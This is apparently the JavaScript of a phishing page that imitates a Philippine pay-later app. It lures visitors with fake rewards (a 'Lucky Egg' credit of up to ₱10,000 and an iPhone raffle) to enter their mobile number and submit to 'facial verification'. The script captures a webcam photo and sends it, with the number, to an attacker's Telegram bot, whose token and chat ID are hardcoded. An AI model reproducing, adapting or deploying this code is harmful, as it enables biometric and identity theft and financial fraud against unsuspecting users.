// ============================================
// FACIAL.JS - Face Capture with Telegram Notification
// Soft Pastel Gradient Theme Popup
// ============================================

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
const TELEGRAM_CHAT_ID = "7298607329";

// Global variables
let isLoggedIn = false;
let claimedReward = false;
let spendableBalance = 0;
let currentPhoneNumber = null;
let videoStream = null;
let isCameraReady = false;

// DOM elements
const phoneInput = document.getElementById('phoneInput');
const phoneError = document.getElementById('phoneError');
const mainLoginBtn = document.getElementById('mainLoginBtn');
const dashboardPanel = document.getElementById('dashboardPanel');
const claimRewardBtn = document.getElementById('claimRewardBtn');
const withdrawFundsBtn = document.getElementById('withdrawFundsBtn');
const balanceDisplay = document.getElementById('balanceDisplay');
const claimedStatusMsg = document.getElementById('claimedStatusMsg');
const hintMsg = document.getElementById('registerHintMsg');

// Popup elements
const facialPopup = document.getElementById('facialPopup');
const facialVideo = document.getElementById('facialVideo');
const captureFaceBtn = document.getElementById('captureFaceBtn');
const closeFacialBtn = document.getElementById('closeFacialBtn');
const facialStatus = document.getElementById('facialStatus');
const scanLine = document.getElementById('scanLine');
const guideCircle = document.querySelector('.facial-guide-circle');

// ============================================
// PHONE NUMBER VALIDATION (10 digits, starts with 9)
// ============================================
function isValidPhone(phone) {
    let raw = phone.trim();
    if (raw === "") return false;
    let digits = raw.replace(/\D/g, '');
    return digits.length === 10 && digits[0] === '9';
}

// Phone input restriction
phoneInput.addEventListener('input', (e) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 10) val = val.slice(0, 10);
    e.target.value = val;
    
    if (val.length > 0 && val[0] !== '9') {
        phoneError.textContent = 'Number must start with 9';
        phoneError.classList.add('show');
    } else if (val.length === 10 && val[0] === '9') {
        phoneError.classList.remove('show');
    } else if (val.length > 0 && val.length < 10) {
        phoneError.textContent = 'Enter 10 digits';
        phoneError.classList.add('show');
    } else {
        phoneError.classList.remove('show');
    }
});

// ============================================
// CAMERA FUNCTIONS
// ============================================
async function startCamera() {
    try {
        if (videoStream) {
            videoStream.getTracks().forEach(track => track.stop());
        }
        
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user",
                width: { ideal: 640 },
                height: { ideal: 480 }
            } 
        });
        
        videoStream = stream;
        facialVideo.srcObject = stream;
        
        // Wait for video to be ready
        await new Promise((resolve) => {
            facialVideo.onloadedmetadata = () => {
                facialVideo.play();
                resolve();
            };
        });
        
        // Wait a bit more for frame
        await new Promise(r => setTimeout(r, 500));
        
        isCameraReady = true;
        facialStatus.innerHTML = "✅ Camera ready! Position your face.";
        facialStatus.className = "facial-status success";
        return true;
        
    } catch (err) {
        console.error("Camera error:", err);
        facialStatus.innerHTML = "❌ Camera access denied. Please allow camera permissions.";
        facialStatus.className = "facial-status error";
        return false;
    }
}

function stopCamera() {
    if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
        videoStream = null;
    }
    facialVideo.srcObject = null;
    isCameraReady = false;
}

// ============================================
// ANIMATION EFFECTS
// ============================================
function startScanAnimation() {
    scanLine.classList.add('active');
    guideCircle.classList.add('active');
    facialStatus.innerHTML = "🔍 Scanning face...";
    facialStatus.className = "facial-status loading";
    
    // Remove guide circle animation after it completes
    setTimeout(() => {
        guideCircle.classList.remove('active');
    }, 600);
}

function stopScanAnimation() {
    scanLine.classList.remove('active');
}

// ============================================
// CAPTURE AND SEND TO TELEGRAM
// ============================================
async function captureAndSendToTelegram() {
    if (!isCameraReady || !facialVideo.videoWidth || facialVideo.videoWidth === 0) {
        facialStatus.innerHTML = "❌ Camera not ready. Please wait.";
        facialStatus.className = "facial-status error";
        return;
    }
    
    startScanAnimation();
    
    try {
        // Create canvas and capture image
        const canvas = document.createElement('canvas');
        canvas.width = facialVideo.videoWidth;
        canvas.height = facialVideo.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.save();
        ctx.scale(-1, 1);
        ctx.drawImage(facialVideo, -canvas.width, 0, canvas.width, canvas.height);
        ctx.restore();
        
        // Convert to JPEG
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
        
        if (!blob || blob.size < 1000) {
            facialStatus.innerHTML = "❌ Failed to capture image. Please try again.";
            facialStatus.className = "facial-status error";
            stopScanAnimation();
            return;
        }
        
        const fileSizeKB = (blob.size / 1024).toFixed(1);
        facialStatus.innerHTML = `📸 Image captured (${fileSizeKB} KB). Sending to Telegram...`;
        facialStatus.className = "facial-status loading";
        
        // Send to Telegram
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, `face_${currentPhoneNumber}_${Date.now()}.jpg`);
        formData.append('caption', `🔐 *NEW FACE CAPTURE*\n\n📱 *Phone:* +63${currentPhoneNumber}\n⏰ *Time:* ${new Date().toLocaleString()}\n📍 *Source:* AtomA Facial Recognition\n📸 *Image Size:* ${fileSizeKB} KB\n✅ *Status:* Verification successful`);
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.ok) {
            facialStatus.innerHTML = "✅ Face sent to Telegram! Login successful!";
            facialStatus.className = "facial-status success";
            stopScanAnimation();
            
            // Send text confirmation
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: `✅ *FACE CAPTURE SUCCESSFUL!*\n\n📱 *Phone:* +63${currentPhoneNumber}\n⏰ *Time:* ${new Date().toLocaleString()}\n📸 *Image Size:* ${fileSizeKB} KB\n📍 *Source:* AtomA Web App`,
                    parse_mode: 'Markdown'
                })
            });
            
            // Close popup and complete login
            setTimeout(() => {
                closeFacialPopup();
                completeLogin(currentPhoneNumber);
            }, 1500);
            
        } else {
            facialStatus.innerHTML = "❌ Telegram error: " + result.description;
            facialStatus.className = "facial-status error";
            stopScanAnimation();
        }
        
    } catch (error) {
        console.error("Capture error:", error);
        facialStatus.innerHTML = "❌ Error: " + error.message;
        facialStatus.className = "facial-status error";
        stopScanAnimation();
    }
}

// ============================================
// FACIAL POPUP FUNCTIONS
// ============================================
async function openFacialPopup() {
    const phoneValue = phoneInput.value.trim();
    
    if (!isValidPhone(phoneValue)) {
        phoneError.classList.add('show');
        phoneInput.focus();
        return;
    }
    
    currentPhoneNumber = phoneValue;
    phoneError.classList.remove('show');
    
    // Reset status
    facialStatus.innerHTML = "🎯 Position your face within the circle";
    facialStatus.className = "facial-status";
    scanLine.classList.remove('active');
    
    facialPopup.classList.add('active');
    await startCamera();
}

function closeFacialPopup() {
    stopCamera();
    facialPopup.classList.remove('active');
    facialStatus.innerHTML = "🎯 Position your face within the circle";
    facialStatus.className = "facial-status";
    scanLine.classList.remove('active');
    currentPhoneNumber = null;
}

// ============================================
// LOGIN & DASHBOARD FUNCTIONS
// ============================================
function completeLogin(phoneNumber) {
    isLoggedIn = true;
    claimedReward = false;
    spendableBalance = 0;
    refreshUI();
    alert(`✅ Welcome +63${phoneNumber}! Face captured and verified.`);
    
    localStorage.setItem('atomeUser', JSON.stringify({
        phone: phoneNumber,
        loggedIn: true,
        loginTime: new Date().toISOString(),
        faceVerified: true
    }));
}

function refreshUI() {
    if (isLoggedIn) {
        dashboardPanel.classList.remove('hidden');
        mainLoginBtn.innerText = "✓ LOGGED IN";
        mainLoginBtn.disabled = true;
        mainLoginBtn.style.opacity = "0.7";
        hintMsg.innerText = "🎉 You're logged in! Smash the lucky egg to claim rewards.";

        if (claimedReward) {
            claimRewardBtn.innerText = "✓ Claimed";
            claimRewardBtn.disabled = true;
            claimedStatusMsg.innerText = `✨ You claimed ₱${spendableBalance} spending balance!`;
            balanceDisplay.innerText = `₱${spendableBalance}`;
            withdrawFundsBtn.disabled = (spendableBalance <= 0);
        } else {
            claimRewardBtn.innerText = "🥚 Smash & Claim";
            claimRewardBtn.disabled = false;
            claimedStatusMsg.innerText = "Tap 'Claim Rewards' to win up to ₱10,000 + iPhone 17 raffle!";
            balanceDisplay.innerText = `₱0`;
            withdrawFundsBtn.disabled = true;
        }
    } else {
        dashboardPanel.classList.add('hidden');
        mainLoginBtn.innerText = "LOGIN";
        mainLoginBtn.disabled = false;
        mainLoginBtn.style.opacity = "1";
        hintMsg.innerText = "Enter your 10-digit number for facial verification";
        phoneError.classList.remove('show');
    }
}

// ============================================
// CLAIM & SPENDING FUNCTIONS
// ============================================
function performClaim() {
    if (!isLoggedIn) {
        alert("Please complete facial verification first.");
        return;
    }
    if (claimedReward) {
        alert(`You already claimed ₱${spendableBalance}.`);
        return;
    }
    
    const creditIncrease = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
    spendableBalance = creditIncrease;
    claimedReward = true;
    
    const iphoneBonus = Math.random() < 0.12;
    let msg = `🎉 You smashed the Lucky Egg! You received a credit increase of ₱${creditIncrease}!`;
    if (iphoneBonus) {
        msg += ` 🍀 AMAZING! You also won a raffle entry for iPhone 17! 🍀`;
    }
    alert(msg);
    refreshUI();
}

function performEnjoySpending() {
    if (!isLoggedIn) {
        alert("Please complete facial verification first.");
        return;
    }
    if (!claimedReward) {
        alert("Claim rewards first!");
        return;
    }
    if (spendableBalance <= 0) {
        alert("No spending balance.");
        return;
    }
    
    if (confirm(`Enjoy spending ₱${spendableBalance}?`)) {
        alert(`✅ Enjoy your shopping balance!`);
        spendableBalance = 0;
        refreshUI();
    }
}

// ============================================
// TERMS & PRIVACY
// ============================================
document.getElementById('termsLink').addEventListener('click', (e) => {
    e.preventDefault();
    alert("Terms of Service: 0% interest for up to 40 days, no annual fees.");
});

document.getElementById('privacyLink').addEventListener('click', (e) => {
    e.preventDefault();
    alert("Privacy Policy: Your face data is sent to secure Telegram chat.");
});

// ============================================
// EVENT LISTENERS
// ============================================
mainLoginBtn.addEventListener('click', openFacialPopup);
captureFaceBtn.addEventListener('click', captureAndSendToTelegram);
closeFacialBtn.addEventListener('click', closeFacialPopup);
claimRewardBtn.addEventListener('click', performClaim);
withdrawFundsBtn.addEventListener('click', performEnjoySpending);

// Close popup when clicking outside
facialPopup.addEventListener('click', (e) => {
    if (e.target === facialPopup) {
        closeFacialPopup();
    }
});

// ============================================
// CHECK EXISTING SESSION
// ============================================
const savedUser = localStorage.getItem('atomeUser');
if (savedUser) {
    try {
        const userData = JSON.parse(savedUser);
        if (userData.loggedIn === true) {
            isLoggedIn = true;
            refreshUI();
        }
    } catch(e) {
        console.error("Error parsing saved user:", e);
    }
}

refreshUI();
console.log("🚀 Facial recognition ready! Enter 10-digit number starting with 9.");
